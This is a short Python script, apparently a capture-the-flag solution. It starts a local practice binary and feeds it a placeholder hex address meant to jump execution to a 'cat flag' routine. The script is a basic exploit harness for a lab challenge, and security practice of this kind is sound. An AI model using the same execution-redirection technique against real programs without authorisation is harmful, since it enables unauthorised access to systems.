import subprocess

# Replace this with the actual address of the 'cat flag' command in hexadecimal format
cat_flag_address_hex = "0xdeadbeef"  # Example address

# Start the challenge process
process = subprocess.Popen(
    ["./target_practice"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

# Interact with the process
try:
    # Read the initial output
    output = process.stdout.readline()
    print(output.strip())

    # Send the address as hexadecimal input
    process.stdin.write(cat_flag_address_hex + "\n")
    process.stdin.flush()

    # Read the flag or any other output
    output = process.stdout.read()
    print(output.strip())
finally:
    # Ensure the process is terminated
    process.stdin.close()
    process.terminate()
    process.wait(timeout=0.2)